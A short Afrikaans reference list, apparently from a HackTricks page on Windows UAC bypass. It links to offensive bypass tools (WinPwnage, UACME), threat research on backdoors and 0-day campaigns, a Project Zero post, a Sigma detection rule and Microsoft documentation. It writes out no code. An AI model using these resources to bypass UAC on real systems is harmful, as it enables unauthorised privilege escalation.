- [4] [WinPwnage – UAC bypass-versoenbaarheidskandeerder en lanseerder](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI neem AI aan om PowerShell-backdoors te genereer](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 0-day exploitation teen Suidoos-Asiatiese regeringsteikens](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Om Windows Administrator Protection te omseil](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Om UAC te omseil met die SilentCleanup-taak](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent-, TabTip- en Narrator-Always Notify-bypasses](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
